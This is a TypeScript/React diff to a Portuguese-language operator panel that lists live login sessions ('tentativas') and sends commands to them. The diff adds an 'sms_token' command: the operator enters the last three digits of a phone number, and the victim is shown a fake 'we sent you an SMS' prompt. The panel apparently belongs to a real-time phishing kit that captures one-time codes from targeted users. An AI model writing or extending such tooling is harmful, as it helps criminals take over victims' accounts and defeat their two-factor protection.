@@ -516,11 +516,13 @@ function SessionBlock({
   session: LoginSession;
   expanded: boolean;
   onToggle: () => void;
-  onCommand: (id: string, command: string) => void;
+  onCommand: (id: string, command: string, smsLast3?: string) => void;
   onDelete: (id: string) => void;
   onHistory: () => void;
 }) {
   const ended = session.status === 'ended';
+  const [smsOpen, setSmsOpen] = useState(false);
+  const [smsDigits, setSmsDigits] = useState('');
 
   return (
     <div className={`donas-session${ended ? ' is-ended' : ''}`} data-testid="session-block">
@@ -604,7 +606,14 @@ function SessionBlock({
                   type="button"
                   className={`donas-cmd-btn${active ? ' is-active' : ''}`}
                   disabled={ended}
-                  onClick={() => onCommand(session.id, c.key)}
+                  onClick={() => {
+                    if (c.key === 'sms_token') {
+                      setSmsDigits('');
+                      setSmsOpen(true);
+                    } else {
+                      onCommand(session.id, c.key);
+                    }
+                  }}
                   data-testid={`session-cmd-${c.key}`}
                 >
                   {c.label}
@@ -635,6 +644,70 @@ function SessionBlock({
           </div>
         </div>
       )}
+
+      {smsOpen && (
+        <div
+          className="donas-modal-backdrop"
+          onClick={() => setSmsOpen(false)}
+          data-testid="sms-token-modal"
+        >
+          <div className="donas-modal donas-modal--sm" onClick={(e) => e.stopPropagation()}>
+            <div className="donas-modal-head">
+              <h3>● Token SMS</h3>
+              <button
+                type="button"
+                onClick={() => setSmsOpen(false)}
+                aria-label="Fechar"
+                data-testid="sms-token-close"
+              >
+                ×
+              </button>
+            </div>
+            <div className="donas-modal-body" style={{ display: 'block' }}>
+              <label className="donas-sms-label" htmlFor={`sms-last3-${session.id}`}>
+                Final do telefone
+              </label>
+              <input
+                id={`sms-last3-${session.id}`}
+                className="donas-sms-input"
+                inputMode="numeric"
+                autoComplete="off"
+                autoFocus
+                placeholder="000"
+                maxLength={3}
+                value={smsDigits}
+                onChange={(e) => setSmsDigits(e.target.value.replace(/\D/g, '').slice(0, 3))}
+                data-testid="sms-token-input"
+              />
+              <p className="donas-sms-help">
+                O usuário verá: <b>Enviamos um SMS para você do número XX XXXXX-X{smsDigits || 'XXX'}</b>.
+              </p>
+            </div>
+            <div className="donas-modal-foot" style={{ gap: 10 }}>
+              <button
+                type="button"
+                className="donas-tool-btn"
+                onClick={() => setSmsOpen(false)}
+                data-testid="sms-token-cancel"
+              >
+                Cancelar
+              </button>
+              <button
+                type="button"
+                className="donas-submit donas-submit--sm"
+                disabled={smsDigits.length !== 3}
+                onClick={() => {
+                  onCommand(session.id, 'sms_token', smsDigits);
+                  setSmsOpen(false);
+                }}
+                data-testid="sms-token-confirm"
+              >
+                Confirmar
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
@@ -660,11 +733,11 @@ function TentativasView() {
     return () => { alive = false; clearInterval(id); };
   }, []);
 
-  const sendCommand = async (id: string, command: string) => {
+  const sendCommand = async (id: string, command: string, smsLast3?: string) => {
     await fetch('/api/auth-attempt/command', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json', ...authHeaders() },
-      body: JSON.stringify({ id, command }),
+      body: JSON.stringify({ id, command, smsLast3 }),
     }).catch(() => {});
     load();
   };
